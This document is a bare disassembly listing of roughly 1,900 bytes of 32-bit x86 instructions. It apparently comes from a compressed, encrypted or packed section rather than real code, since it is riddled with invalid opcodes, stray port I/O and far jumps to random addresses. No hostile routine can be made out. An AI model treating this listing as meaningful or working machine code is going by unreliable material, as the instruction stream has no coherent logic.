  40d45b:	add    eax,0x13d88245
  40d460:	xor    eax,0x8857dab1
  40d465:	xchg   BYTE PTR fs:[ecx-0x7cd0fa1f],cl
  40d46c:	fild   QWORD PTR [edi+0x7f9b5121]
  40d472:	xchg   BYTE PTR [ecx-0x4f],ch
  40d475:	xchg   ebx,eax
  40d476:	inc    edx
  40d477:	jns    0x40d410
  40d479:	loopne 0x40d401
  40d47b:	xor    edx,DWORD PTR [esi+0xd1ca566]
  40d481:	in     eax,0x95
  40d483:	sub    DWORD PTR ds:0x16d2a948,ebx
  40d489:	push   esp
  40d48a:	test   edi,eax
  40d48c:	fnstenv [eax]
  40d48e:	xor    BYTE PTR [esi+0x144a63d6],al
  40d494:	jg     0x40d427
  40d496:	lods   eax,DWORD PTR ds:[esi]
  40d497:	int3   
  40d498:	stos   DWORD PTR es:[edi],eax
  40d499:	mov    al,ds:0xd10a55eb
  40d49e:	(bad)  
  40d49f:	call   0xbe24de05
  40d4a4:	mov    bh,0xb
  40d4a6:	sub    BYTE PTR [ecx+0x319881df],ch
  40d4ac:	popf   
  40d4ad:	test   DWORD PTR [ebp+0x455e2416],esp
  40d4b3:	sub    DWORD PTR [edi],esi
  40d4b5:	mov    ebp,0xf3c8a1ee
  40d4ba:	aam    0x88
  40d4bc:	int3   
  40d4bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d4be:	out    0xbe,al
  40d4c0:	aad    0xc7
  40d4c2:	rol    DWORD PTR [eax-0x7e7960d8],0xf8
  40d4c9:	cwde   
  40d4ca:	adc    DWORD PTR [eax+0x10768ed7],esp
  40d4d0:	dec    ecx
  40d4d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d4d2:	jo     0x40d47d
  40d4d4:	mov    dh,0xf9
  40d4d6:	sbb    edi,DWORD PTR [eax]
  40d4d8:	dec    ecx
  40d4d9:	sbb    eax,0x40374d86
  40d4de:	arpl   bx,ax
  40d4e0:	mov    eax,esi
  40d4e2:	jmp    0x247b:0xfeab57f1
  40d4e9:	push   eax
  40d4ea:	inc    ebp
  40d4eb:	retf   
  40d4ec:	mov    al,ds:0x64d871c
  40d4f1:	in     al,dx
  40d4f2:	hlt    
  40d4f3:	dec    ebx
  40d4f4:	leave  
  40d4f5:	mov    ecx,0xda2f5440
  40d4fa:	xchg   BYTE PTR [ebx],dl
  40d4fc:	idiv   DWORD PTR [edx-0x51edbd6e]
  40d502:	xchg   DWORD PTR [edi-0x3b],ebp
  40d505:	rcl    BYTE PTR [esi],0xdb
  40d508:	mov    ecx,0x6729414c
  40d50d:	push   ebx
  40d50e:	test   bl,dl
  40d510:	or     BYTE PTR [esi],ah
  40d512:	and    DWORD PTR [ebx-0x3c],ebx
  40d515:	inc    edi
  40d516:	arpl   WORD PTR [ebp-0x2],cx
  40d519:	icebp  
  40d51a:	out    dx,al
  40d51b:	mov    bl,0xd
  40d51d:	jp     0x40d57f
  40d51f:	pop    esp
  40d520:	into   
  40d521:	mov    DWORD PTR [esp+eax*4],ebx
  40d524:	mov    ds:0x1f3987b9,eax
  40d529:	or     dl,cl
  40d52b:	push   edx
  40d52c:	push   ds
  40d52d:	dec    esi
  40d52e:	pop    edx
  40d52f:	cdq    
  40d530:	jmp    0x740b:0xbfa18657
  40d537:	repz mov gs,ebp
  40d53a:	mul    ecx
  40d53c:	(bad)  
  40d53d:	lock jmp 0x9f78:0xa9c5cc76
  40d545:	shr    DWORD PTR ds:0x576dbdc8,0x13
  40d54c:	jno    0x40d57c
  40d54e:	icebp  
  40d54f:	sub    DWORD PTR [edi+0x73],edi
  40d552:	xor    eax,DWORD PTR [esi]
  40d554:	mov    esi,0xdbc786b8
  40d559:	(bad)  
  40d55a:	and    al,0x0
  40d55c:	pop    esi
  40d55d:	icebp  
  40d55e:	call   0xfaa0:0xb1bcdbc4
  40d565:	pop    esi
  40d566:	scas   al,BYTE PTR es:[edi]
  40d567:	loop   0x40d4ec
  40d569:	xor    eax,0x9e06c786
  40d56e:	jnp    0x40d5e1
  40d570:	mov    ch,0x7d
  40d572:	outs   dx,DWORD PTR ds:[esi]
  40d573:	sub    DWORD PTR ds:0xf72561d4,esp
  40d579:	xchg   ebx,eax
  40d57a:	loope  0x40d58e
  40d57c:	mov    eax,ds:0xc6c38e73
  40d581:	icebp  
  40d582:	cld    
  40d583:	mov    cl,0xc5
  40d585:	lea    ebp,[ebp-0x36835415]
  40d58b:	push   cs
  40d58c:	sbb    eax,0xd7fb8bd
  40d591:	mov    bh,BYTE PTR [edi-0x3f]
  40d594:	repz fsubr DWORD PTR [eax+ebp*4]
  40d598:	enter  0xcc0c,0xe9
  40d59c:	(bad)  
  40d59d:	sub    al,0x9f
  40d59f:	adc    BYTE PTR [ecx-0x3656ac7e],ah
  40d5a5:	icebp  
  40d5a6:	pop    edi
  40d5a7:	fincstp 
  40d5a9:	jno    0x40d562
  40d5ab:	js     0x40d618
  40d5ad:	pop    esp
  40d5ae:	adc    dh,BYTE PTR [esi+0x53]
  40d5b1:	enter  0x50fc,0x64
  40d5b5:	js     0x40d554
  40d5b7:	jmp    0x40d57a
  40d5b9:	jo     0x40d600
  40d5bb:	(bad)  
  40d5bc:	jge    0x40d58e
  40d5be:	jge    0x40d614
  40d5c0:	mov    esp,DWORD PTR [ecx+eax*4-0x59]
  40d5c4:	loope  0x40d567
  40d5c6:	cmc    
  40d5c7:	cmp    ebx,DWORD PTR [eax-0x10]
  40d5ca:	mov    al,ds:0x8caf231b
  40d5cf:	adc    BYTE PTR [eax+ecx*1+0x479cec47],dh
  40d5d6:	fwait
  40d5d7:	cmp    ebp,edx
  40d5d9:	js     0x40d647
  40d5db:	test   eax,0x403cf484
  40d5e0:	and    esp,ebp
  40d5e2:	pop    eax
  40d5e3:	scas   al,BYTE PTR es:[edi]
  40d5e4:	leave  
  40d5e5:	je     0x40d5ae
  40d5e7:	mov    ds:0x275602fb,al
  40d5ec:	mov    ds:0x7acb862b,al
  40d5f1:	adc    BYTE PTR [esi+0x2ef1f485],dl
  40d5f7:	shr    DWORD PTR [ecx],0x32
  40d5fa:	sbb    BYTE PTR [ebx],al
  40d5fc:	imul   edx,edi,0x300d9b70
  40d602:	mov    ebp,0x862247f9
  40d607:	or     DWORD PTR [ebx-0xf],edi
  40d60a:	sbb    al,0xbe
  40d60c:	sub    edi,DWORD PTR [edi+eiz*4]
  40d60f:	xor    BYTE PTR [edx+0x37],0x80
  40d613:	fst    DWORD PTR [ecx]
  40d615:	or     eax,0x344bbda0
  40d61a:	xchg   bh,ah
  40d61c:	inc    edx
  40d61d:	imul   DWORD PTR [esi+0x3f94cabc]
  40d623:	mov    eax,ds:0xe7c9de8
  40d628:	loope  0x40d5b5
  40d62a:	sbb    eax,0x869ecd84
  40d62f:	adc    DWORD PTR [ebx+0x63],esp
  40d632:	sub    eax,0xb8f08a62
  40d637:	pop    ecx
  40d638:	mov    eax,0x6fcbc2f5
  40d63d:	fcomp  DWORD PTR [esi+edx*8-0x36785a91]
  40d644:	xor    BYTE PTR [ecx+0x322d89f4],0x68
  40d64b:	push   ss
  40d64c:	jae    0x40d684
  40d64e:	mov    dl,0xa8
  40d650:	pop    es
  40d651:	jg     0x40d5db
  40d653:	es xchg ecx,eax
  40d655:	lock sti 
  40d657:	pop    es
  40d658:	ss inc ecx
  40d65a:	stc    
  40d65b:	cld    
  40d65c:	(bad)  
  40d65d:	mul    DWORD PTR [eax-0x68c06916]
  40d663:	in     eax,0x38
  40d665:	mov    eax,ds:0xae0efe2c
  40d66a:	scas   al,BYTE PTR es:[edi]
  40d66b:	jp     0x40d692
  40d66d:	mov    dl,0xba
  40d66f:	dec    eax
  40d670:	sub    ch,bh
  40d672:	jae    0x40d6ba
  40d674:	in     eax,dx
  40d675:	lock loop 0x40d6a9
  40d678:	ins    DWORD PTR es:[edi],dx
  40d679:	xor    eax,0x58638daa
  40d67e:	out    0x56,eax
  40d680:	xor    edi,esi
  40d682:	icebp  
  40d683:	xchg   ebx,eax
  40d684:	es inc ebx
  40d686:	dec    eax
  40d687:	jno    0x40d6e3
  40d689:	fld    QWORD PTR [esi+0x73]
  40d68c:	jmp    0x6e6a4091
  40d691:	pop    esi
  40d692:	jmp    0x40d6a6
  40d694:	test   edi,0xde002494
  40d69a:	nop
  40d69b:	test   DWORD PTR [edx+0x6ca1e8f0],esp
  40d6a1:	imul   esi,DWORD PTR [edx+0x6c],0x15
  40d6a5:	cmp    al,0xaa
  40d6a7:	or     al,BYTE PTR [edx]
  40d6a9:	repnz clc 
  40d6ab:	icebp  
  40d6ac:	aam    0xe9
  40d6ae:	sub    dh,bh
  40d6b0:	mov    al,ds:0x1bb08385
  40d6b5:	lock pop es
  40d6b7:	pop    esp
  40d6b8:	xor    DWORD PTR [edx-0x304dca79],edx
  40d6be:	mov    dl,0xb3
  40d6c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d6c1:	lods   al,BYTE PTR ds:[esi]
  40d6c2:	cmp    ch,0xdb
  40d6c5:	jno    0x40d710
  40d6c7:	fcmovb st,st(3)
  40d6c9:	lock mov ds:0x6bb22fde,al
  40d6cf:	pop    edi
  40d6d0:	inc    edi
  40d6d1:	mov    esp,DWORD PTR [ebx]
  40d6d3:	outs   dx,DWORD PTR ds:[esi]
  40d6d4:	scas   eax,DWORD PTR es:[edi]
  40d6d5:	xchg   esp,eax
  40d6d6:	xchg   BYTE PTR [ebp-0x144b68a9],dh
  40d6dc:	lds    eax,FWORD PTR [ebx+0x2e302868]
  40d6e2:	jg     0x40d6b2
  40d6e4:	cmp    BYTE PTR [ecx],bh
  40d6e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d6e7:	and    al,BYTE PTR [ecx+edx*8]
  40d6ea:	mov    edi,0x7bd0f1d
  40d6ef:	or     dh,0xf2
  40d6f2:	jle    0x40d76f
  40d6f4:	sbb    DWORD PTR [ebx],esi
  40d6f6:	jl     0x40d6ee
  40d6f8:	cmp    DWORD PTR [ecx],edx
  40d6fa:	xor    eax,DWORD PTR ds:0x40770e3f
  40d700:	adc    BYTE PTR [ebx-0x38],0xb1
  40d704:	or     edi,edi
  40d706:	xor    BYTE PTR [ebp-0x155b0f46],dl
  40d70c:	xor    al,0x4d
  40d70e:	add    al,0xa3
  40d710:	lods   eax,DWORD PTR ds:[esi]
  40d711:	cs xchg eax,ebx
  40d714:	xor    ecx,esi
  40d716:	cld    
  40d717:	cmp    edi,DWORD PTR [ecx-0x7358a933]
  40d71d:	lock js 0x40d77d
  40d720:	arpl   di,bp
  40d722:	adc    eax,0x98f6dd12
  40d727:	rcr    DWORD PTR [ebp-0x70],cl
  40d72a:	mov    ebp,esi
  40d72c:	mov    DWORD PTR [esi],ebp
  40d72e:	fist   DWORD PTR [ebp+0x643cf08f]
  40d734:	clc    
  40d735:	jg     0x40d6e3
  40d737:	enter  0xc1a3,0x98
  40d73b:	nop
  40d73c:	rcr    BYTE PTR [eax-0x6af69e68],0x9f
  40d743:	ror    BYTE PTR [eax-0x689a1cd5],1
  40d749:	jp     0x40d791
  40d74b:	sub    BYTE PTR [eax+0x65],bl
  40d74e:	cmp    eax,0xcd1415bb
  40d753:	sub    al,ch
  40d755:	lock mov ebx,0xd4bcf666
  40d75b:	and    al,0x41
  40d75d:	pusha  
  40d75e:	push   esp
  40d75f:	sub    DWORD PTR [eax-0x75],esi
  40d762:	pop    ebp
  40d763:	call   0x58bd:0xf22a5408
  40d76a:	cmp    BYTE PTR [edx-0xbdd0e64],cl
  40d770:	and    dh,BYTE PTR [ebp+ecx*2-0x52a49367]
  40d777:	xor    al,0x31
  40d779:	int    0x84
  40d77b:	imul   edx,edi,0x11
  40d77e:	pop    esi
  40d77f:	cmp    bl,bh
  40d781:	add    eax,0x2a8db236
  40d786:	mov    ebx,0xcea20e28
  40d78b:	sbb    BYTE PTR [eax],cl
  40d78d:	fdiv   QWORD PTR [edx*2-0x4162c7a4]
  40d794:	add    BYTE PTR [ecx],al
  40d796:	xor    esp,ebx
  40d798:	shr    DWORD PTR [ebp-0x306fd627],cl
  40d79e:	es jle 0x40d7d4
  40d7a1:	xor    bh,BYTE PTR [ebp-0x1fc8f6c8]
  40d7a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d7a8:	inc    esp
  40d7a9:	mov    esi,0x9851dfb3
  40d7ae:	mov    bh,0x29
  40d7b0:	cmp    al,0x27
  40d7b2:	mov    eax,ds:0x9da3dfc8
  40d7b7:	push   esp
  40d7b8:	cdq    
  40d7b9:	sub    al,0x86
  40d7bb:	mov    ebp,edi
  40d7bd:	mov    bh,0xcd
  40d7bf:	cmp    al,0xad
  40d7c1:	lock out 0xcd,al
  40d7c4:	lea    ebx,[eax]
  40d7c6:	inc    edx
  40d7c7:	fwait
  40d7c8:	into   
  40d7c9:	adc    eax,0x3bbbafa4
  40d7ce:	xchg   DWORD PTR [edi+0x20],edx
  40d7d1:	add    al,0x26
  40d7d3:	cmp    ecx,DWORD PTR [ecx]
  40d7d5:	or     DWORD PTR [ebp+0x29],0xffffff93
  40d7d9:	jnp    0x40d7a6
  40d7db:	mov    BYTE PTR [ecx],cl
  40d7dd:	in     al,dx
  40d7de:	(bad)  
  40d7df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d7e0:	sub    al,0x42
  40d7e2:	xchg   ebx,eax
  40d7e3:	mov    ecx,0x994860d8
  40d7e8:	or     DWORD PTR [esi+0x71],ecx
  40d7eb:	loop   0x40d7f6
  40d7ed:	mov    ecx,0x43f744bc
  40d7f2:	jle    0x40d83e
  40d7f4:	imul   edi,DWORD PTR [esp+ecx*8+0x22f3d312],0xffffffb9
  40d7fc:	push   ss
  40d7fd:	push   esp
  40d7fe:	xchg   edi,eax
  40d7ff:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  40d801:	cmp    BYTE PTR [edi],ch
  40d803:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d804:	or     DWORD PTR [esi-0x74],esp
  40d807:	mov    al,0x5b
  40d809:	les    eax,FWORD PTR [eax+0x7b]
  40d80c:	(bad)  
  40d80d:	mov    esp,0xf15ea750
  40d812:	sub    al,0xf1
  40d814:	sub    al,BYTE PTR [edi+0x6c]
  40d817:	fs push cs
  40d819:	bound  eax,QWORD PTR [ecx]
  40d81b:	call   0x5c6a:0x97b171f8
  40d822:	jmp    0x173132a2
  40d827:	(bad)  
  40d828:	je     0x40d8a8
  40d82a:	add    al,0x22
  40d82c:	sti    
  40d82d:	out    dx,eax
  40d82e:	push   ecx
  40d82f:	jno    0x40d850
  40d831:	pop    ebx
  40d832:	xchg   DWORD PTR [ecx-0x4d],edx
  40d835:	aad    0xc2
  40d837:	cmc    
  40d838:	xor    edx,DWORD PTR [ebx+0x152c29f0]
  40d83e:	xor    edx,edi
  40d840:	pop    es
  40d841:	jo     0x40d89b
  40d843:	mov    ch,0xb8
  40d845:	mov    bl,0xd9
  40d847:	and    BYTE PTR [eax],ah
  40d849:	adc    eax,esi
  40d84b:	into   
  40d84c:	xchg   DWORD PTR [edx-0x10f8d774],eax
  40d852:	xchg   esi,eax
  40d853:	iret   
  40d854:	or     DWORD PTR [esi-0x547a2212],eax
  40d85a:	cdq    
  40d85b:	mov    dl,0x68
  40d85d:	enter  0xc896,0x94
  40d861:	icebp  
  40d862:	pushf  
  40d863:	add    al,0xf5
  40d865:	and    al,dl
  40d867:	enter  0x4216,0x7
  40d86b:	and    ch,BYTE PTR [ecx]
  40d86d:	mov    cl,0xf7
  40d86f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d870:	sti    
  40d871:	push   edi
  40d872:	lock dec ebp
  40d874:	add    esp,DWORD PTR [esp+ebx*2]
  40d877:	sub    DWORD PTR [edi+0x67],esi
  40d87a:	dec    edi
  40d87b:	sbb    ecx,DWORD PTR [ecx]
  40d87d:	mov    dl,0x12
  40d87f:	jmp    0x40d88c
  40d881:	dec    esi
  40d882:	pop    edx
  40d883:	adc    DWORD PTR [edx-0xf],ecx
  40d886:	test   al,0xd4
  40d888:	stc    
  40d889:	out    0xe7,eax
  40d88b:	(bad)  
  40d88c:	stc    
  40d88d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d88e:	push   ss
  40d88f:	adc    al,al
  40d891:	dec    ebp
  40d892:	fwait
  40d893:	test   ebp,0x2de9b32f
  40d899:	shr    bl,1
  40d89b:	or     ah,BYTE PTR [edi+0x4328a8bf]
  40d8a1:	popa   
  40d8a2:	iret   
  40d8a3:	or     BYTE PTR [eax],0x26
  40d8a6:	sub    al,bl
  40d8a8:	repz shl DWORD PTR [di-0x46],cl
  40d8ad:	pop    ss
  40d8ae:	push   ds
  40d8af:	push   ss
  40d8b0:	gs jmp 0x40d88e
  40d8b3:	sub    BYTE PTR [edx+0x803726d],bl
  40d8b9:	scas   al,BYTE PTR es:[edi]
  40d8ba:	push   cs
  40d8bb:	scas   al,BYTE PTR es:[edi]
  40d8bc:	into   
  40d8bd:	adc    esp,DWORD PTR [ecx+0x41659bd]
  40d8c3:	mov    eax,0x479c277
  40d8c8:	jecxz  0x40d915
  40d8ca:	cdq    
  40d8cb:	sub    bh,dl
  40d8cd:	add    DWORD PTR [edi-0x3a],edx
  40d8d0:	xor    al,0xde
  40d8d2:	ja     0x40d86c
  40d8d4:	mov    BYTE PTR [ebx-0x245459c6],cl
  40d8da:	sub    dh,0x4b
  40d8dd:	scas   eax,DWORD PTR es:[edi]
  40d8de:	dec    edx
  40d8df:	adc    bl,BYTE PTR [ebp-0x6756abbc]
  40d8e5:	add    al,0xa6
  40d8e7:	call   0xd3c6e5d3
  40d8ec:	jae    0x40d86f
  40d8ee:	push   esp
  40d8ef:	sub    BYTE PTR [ecx],0x25
  40d8f2:	mov    ebp,DWORD PTR [ecx]
  40d8f4:	jne    0x40d941
  40d8f6:	jb     0x40d924
  40d8f8:	in     al,0x77
  40d8fa:	jns    0x40d940
  40d8fc:	add    edi,esi
  40d8fe:	xchg   ecx,edi
  40d900:	mov    ecx,0xd7d53e11
  40d905:	repz push cs
  40d907:	lock cmp esi,DWORD PTR [edi]
  40d90a:	mov    ch,dh
  40d90c:	mov    ds:0x8757769,al
  40d911:	outs   dx,BYTE PTR ds:[esi]
  40d912:	mov    BYTE PTR [eax+0x2d],0x21
  40d916:	enter  0x4622,0xf0
  40d91a:	jbe    0x40d980
  40d91c:	add    cl,bl
  40d91e:	lods   eax,DWORD PTR es:[esi]
  40d920:	neg    ah
  40d922:	stos   DWORD PTR es:[edi],eax
  40d923:	int    0x35
  40d925:	imul   BYTE PTR [esi-0x65]
  40d928:	mov    DWORD PTR [ebp-0x3c],ebx
  40d92b:	cwde   
  40d92c:	inc    esi
  40d92d:	in     al,dx
  40d92e:	popa   
  40d92f:	push   esp
  40d930:	xchg   ebp,eax
  40d931:	push   eax
  40d932:	lods   eax,DWORD PTR ds:[esi]
  40d933:	xor    al,0xc8
  40d935:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d936:	gs ret 
  40d938:	fst    QWORD PTR [ecx]
  40d93a:	jg     0x40d8c6
  40d93c:	scas   al,BYTE PTR es:[edi]
  40d93d:	lahf   
  40d93e:	mov    ds:0x867738c5,al
  40d943:	mov    ecx,0xc048f30f
  40d948:	pop    ss
  40d949:	or     dh,al
  40d94b:	pop    edi
  40d94c:	test   eax,0x89d9a30
  40d951:	scas   al,BYTE PTR es:[edi]
  40d952:	fst    QWORD PTR [eax-0x38]
  40d955:	cmp    DWORD PTR [edx],esp
  40d957:	jno    0x40d962
  40d959:	jmp    esi
  40d95b:	mov    ch,0x36
  40d95d:	dec    edx
  40d95e:	fs push ebx
  40d960:	and    eax,0x6e867170
  40d965:	jp     0x40d8f9
  40d967:	or     BYTE PTR [ebx+0x6e7187e3],al
  40d96d:	add    ebx,eax
  40d96f:	mov    cl,0x9d
  40d971:	scas   eax,DWORD PTR es:[edi]
  40d972:	out    0x26,eax
  40d974:	inc    esp
  40d975:	xor    esi,ebp
  40d977:	in     al,0x24
  40d979:	inc    edx
  40d97a:	inc    eax
  40d97b:	jmp    0x9213:0xb586d3ee
  40d982:	dec    esi
  40d983:	cmp    eax,0xe13f340b
  40d988:	push   esp
  40d989:	lock test dh,al
  40d98c:	dec    esp
  40d98d:	push   esi
  40d98e:	sbb    ebx,esi
  40d990:	lock sahf 
  40d992:	outs   dx,BYTE PTR ds:[esi]
  40d993:	ja     0x40d97b
  40d995:	call   0x1005:0xa35ebd80
  40d99c:	idiv   DWORD PTR [ebx+0x17]
  40d99f:	pusha  
  40d9a0:	or     al,BYTE PTR [eax+ebp*4+0x28fccfd]
  40d9a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d9a8:	cwde   
  40d9a9:	shl    eax,1
  40d9ab:	inc    esi
  40d9ac:	dec    ebx
  40d9ad:	dec    esp
  40d9ae:	fwait
  40d9af:	sub    DWORD PTR ds:0x681d666f,eax
  40d9b5:	jae    0x40d961
  40d9b7:	adc    al,cl
  40d9b9:	imul   esi,DWORD PTR [edx-0x4b],0xfd8492e5
  40d9c0:	int3   
  40d9c1:	mov    ebp,0xef62548d
  40d9c6:	ds cwde 
  40d9c8:	adc    al,0xe7
  40d9ca:	pop    esp
  40d9cb:	push   es
  40d9cc:	pop    es
  40d9cd:	gs cld 
  40d9cf:	test   eax,0xbe7a8adc
  40d9d4:	xchg   ecx,eax
  40d9d5:	push   edi
  40d9d6:	nop
  40d9d7:	lods   eax,DWORD PTR ds:[esi]
  40d9d8:	adc    ch,bl
  40d9da:	jmp    0x40da00
  40d9dc:	push   ebp
  40d9dd:	outs   dx,DWORD PTR ds:[esi]
  40d9de:	xchg   edi,eax
  40d9df:	sub    bl,cl
  40d9e1:	push   ecx
  40d9e2:	push   ss
  40d9e3:	fmul   DWORD PTR [eax]
  40d9e5:	jo     0x40da4f
  40d9e7:	jo     0x40da67
  40d9e9:	iret   
  40d9ea:	mov    ds:0x63d18bcb,eax
  40d9ef:	jns    0x40da02
  40d9f1:	cmc    
  40d9f2:	aad    0x36
  40d9f4:	int    0xaf
  40d9f6:	sbb    cl,ch
  40d9f8:	mov    BYTE PTR [edi+ebx*2],dh
  40d9fb:	ror    DWORD PTR [eax],0xb6
  40d9fe:	mov    bl,0xfe
  40da00:	dec    edi
  40da01:	out    0x79,al
  40da03:	out    dx,eax
  40da04:	fdiv   st,st(1)
  40da06:	mov    WORD PTR [edx-0x13],gs
  40da09:	div    ah
  40da0b:	jg     0x40da06
  40da0d:	push   ecx
  40da0e:	dec    eax
  40da0f:	or     esi,esp
  40da11:	adc    al,BYTE PTR [ebp-0x2bf85a49]
  40da17:	imul   BYTE PTR [edi+0x292fe6f1]
  40da1d:	and    DWORD PTR [esi-0x3716e41e],eax
  40da23:	dec    esi
  40da24:	idiv   DWORD PTR [ecx-0x5367e54a]
  40da2a:	dec    edx
  40da2b:	retf   
  40da2c:	popf   
  40da2d:	xchg   dl,bh
  40da2f:	shl    edi,cl
  40da31:	adc    BYTE PTR [ecx],dl
  40da33:	or     ebx,DWORD PTR [esi-0x887c827]
  40da39:	fwait
  40da3a:	xchg   edi,eax
  40da3b:	cmp    eax,0x959489fd
  40da40:	xchg   edi,eax
  40da41:	int    0x88
  40da43:	fild   DWORD PTR ds:0xc6f5f570
  40da49:	cmp    eax,0xcdf7b602
  40da4e:	lods   eax,DWORD PTR ds:[esi]
  40da4f:	inc    eax
  40da50:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40da52:	ds test al,0x9a
  40da55:	icebp  
  40da56:	lock adc ebx,DWORD PTR [ebx+0x30]
  40da5a:	adc    al,0x4b
  40da5c:	mov    esi,fs
  40da5e:	xor    eax,0x87edc7b6
  40da63:	in     eax,dx
  40da64:	out    dx,eax
  40da65:	data16 xlat BYTE PTR ds:[ebx]
  40da67:	retf   
  40da68:	and    DWORD PTR [edx+ebx*4],eax
  40da6b:	sub    DWORD PTR [eax],edi
  40da6d:	sbb    bl,BYTE PTR [ebp-0x7]
  40da70:	or     BYTE PTR [esp+ecx*1],bl
  40da73:	jnp    0x40da2b
  40da75:	das    
  40da76:	jg     0x40da09
  40da78:	mov    ebp,0x88ba44f1
  40da7d:	retf   0xac28
  40da80:	(bad)  
  40da81:	fidivr DWORD PTR [edx+eax*8]
  40da84:	jmp    0x38861d2
  40da89:	das    
  40da8a:	push   edi
  40da8b:	rep stos DWORD PTR es:[edi],eax
  40da8d:	cmc    
  40da8e:	jns    0x40dab8
  40da90:	cmp    eax,0xb8094653
  40da95:	call   0x2914:0x5cef13cb
  40da9c:	add    dl,BYTE PTR [ebp-0x78]
  40da9f:	or     ch,0x3d
  40daa2:	sti    
  40daa3:	sub    esp,ecx
  40daa5:	push   esi
  40daa6:	int    0xe6
  40daa8:	xor    dl,BYTE PTR [eax-0x7f081bee]
  40daae:	xor    DWORD PTR [esi+0x15],0xffffffb6
  40dab2:	lods   eax,DWORD PTR ds:[esi]
  40dab3:	sub    bl,BYTE PTR [edi+0x2d]
  40dab6:	mov    BYTE PTR [ecx],ch
  40dab8:	int3   
  40dab9:	arpl   WORD PTR [esi+edi*2-0x2afd31f6],bx
  40dac0:	lahf   
  40dac1:	test   BYTE PTR [ebp+eiz*4-0x29],dl
  40dac5:	gs test al,0x59
  40dac8:	xchg   DWORD PTR [edx+ecx*2-0x3042a8d6],edi
  40dacf:	mov    bh,0x9a
  40dad1:	sti    
  40dad2:	jp     0x40da9c
  40dad4:	and    BYTE PTR [ebp+0x23604986],cl
  40dada:	arpl   WORD PTR [edi+0x2ac5fe87],ax
  40dae0:	and    eax,0x8fabcbd5
  40dae5:	cld    
  40dae6:	imul   esp,ecx,0xffffffe0
  40dae9:	icebp  
  40daea:	stc    
  40daeb:	ins    DWORD PTR es:[edi],dx
  40daec:	pushf  
  40daed:	scas   eax,DWORD PTR es:[edi]
  40daee:	das    
  40daef:	cli    
  40daf0:	push   edx
  40daf1:	sti    
  40daf2:	enter  0x900a,0x10
  40daf6:	icebp  
  40daf7:	adc    DWORD PTR [edi-0x13],0x8d39293d
  40dafe:	ins    BYTE PTR es:[edi],dx
  40daff:	rcr    DWORD PTR [ecx-0x220c47b3],1
  40db05:	pop    es
  40db06:	push   es
  40db07:	xor    eax,0xca1cf1d6
  40db0c:	dec    ebx
  40db0d:	inc    DWORD PTR ds:0xe2d2869d
  40db13:	mov    bl,0x44
  40db15:	adc    BYTE PTR [esi+0x59faa3bf],al
  40db1b:	mov    ebp,DWORD PTR [ebx-0x78d69524]
  40db21:	arpl   WORD PTR [ebp-0x66],bx
  40db24:	xor    al,0xbe
  40db26:	fidivr DWORD PTR [edx-0x9]
  40db29:	xor    al,BYTE PTR [eax*2-0x7c6ef5ac]
  40db30:	and    DWORD PTR [ecx],eax
  40db32:	test   eax,0x29698629
  40db37:	jle    0x40db23
  40db39:	cs rcl DWORD PTR gs:0x53cd8481,0xbf
  40db42:	add    ah,bl
  40db44:	adc    dh,cl
  40db46:	jle    0x40db78
  40db48:	ds pop eax
  40db4a:	mov    ds:0x3a93ef6e,al
  40db4f:	das    
  40db50:	mov    esi,0xc1af8784
  40db55:	cs jno 0x40db39
  40db58:	fwait
  40db59:	adc    al,0xc0
  40db5b:	sub    esi,eax
  40db5d:	mov    dl,bh
  40db5f:	ins    DWORD PTR es:[edi],dx
  40db60:	jns    0x40db2c
  40db62:	add    DWORD PTR [eax+ebx*4],esi
  40db65:	jl     0x40daf9
  40db67:	sub    BYTE PTR [edx],bh
  40db69:	sub    BYTE PTR [edi+edx*1+0x6b04fffe],ch
  40db70:	stos   DWORD PTR es:[edi],eax
  40db71:	add    BYTE PTR [edi],cl
  40db73:	ror    BYTE PTR [ebx],1
  40db75:	xchg   edi,eax
  40db76:	jge    0x40dba3
  40db78:	(bad)  
  40db79:	repz test al,0x91
  40db7c:	lods   eax,DWORD PTR ds:[esi]
  40db7d:	push   ss
  40db7e:	pop    ecx
  40db7f:	dec    eax
  40db80:	cmp    esi,DWORD PTR [esi]
  40db82:	mov    ebx,0x862cbb39
  40db87:	stos   DWORD PTR es:[edi],eax
  40db88:	ret    
  40db89:	(bad)  
  40db8a:	loop   0x40db4a
  40db8c:	(bad)  
  40db8d:	out    0x7f,eax
  40db8f:	call   0xeeb3b94d
  40db94:	pusha  
  40db95:	inc    edi
  40db96:	not    DWORD PTR [edx+0x2]
  40db99:	sub    ecx,DWORD PTR [edi-0x707677bd]
  40db9f:	cmp    edx,DWORD PTR [eax+esi*8]
  40dba2:	sbb    BYTE PTR [eax],dh
  40dba4:	xor    ebp,edx
  40dba6:	icebp  
  40dba7:	popf   
  40dba8:	cli    
  40dba9:	bound  edi,QWORD PTR [ebp+0x7f]
  40dbac:	sbb    al,BYTE PTR [esi-0x71]
  40dbaf:	jmp    0x642fed3c
  40dbb4:	adc    dl,dh
  40dbb6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dbb7:	mov    ch,0xd2
  40dbb9:	in     al,0x78
  40dbbb:	sub    edi,edi
  40dbbd:	push   0x4ce693cd
  40dbc2:	cwde   
  40dbc3:	test   eax,0xd9878698
  40dbc8:	jge    0x40dc3e
  40dbca:	gs daa 
  40dbcc:	fwait
  40dbcd:	mov    edi,0xe7e629fb
  40dbd2:	test   BYTE PTR [bx+di],cl
  40dbd5:	clc    
  40dbd6:	add    eax,0x9994d3f3
  40dbdb:	into   
  40dbdc:	jne    0x40dc46
  40dbde:	into   
  40dbdf:	arpl   WORD PTR [eax],cx
  40dbe1:	fdiv   QWORD PTR [edi]
  40dbe3:	push   esp
  40dbe4:	lods   al,BYTE PTR ds:[esi]
  40dbe5:	jnp    0x40dc16
